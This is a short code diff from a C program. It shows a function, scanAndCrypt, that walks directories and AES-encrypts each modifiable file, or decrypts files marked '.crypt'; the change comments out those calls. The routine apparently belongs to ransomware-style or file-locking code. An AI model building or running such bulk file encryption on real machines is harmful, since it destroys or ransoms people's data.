@@ -59,10 +59,10 @@ void scanAndCrypt(char *path, unsigned char *key, bool encrypt){
                 continue;
             if(isFile(pathName)){
                 if(canBeModified(pathName)){
-                    if(encrypt)
+                    /*if(encrypt)
                         encryptAES(pathName, key);
                     else if(strstr(pathName, ".crypt")!= NULL)
-                        decryptAES(pathName, key);
+                        decryptAES(pathName, key);*/
                     //prepare(pathName);
                     //printf("file: %s\n", pathName);
                 }
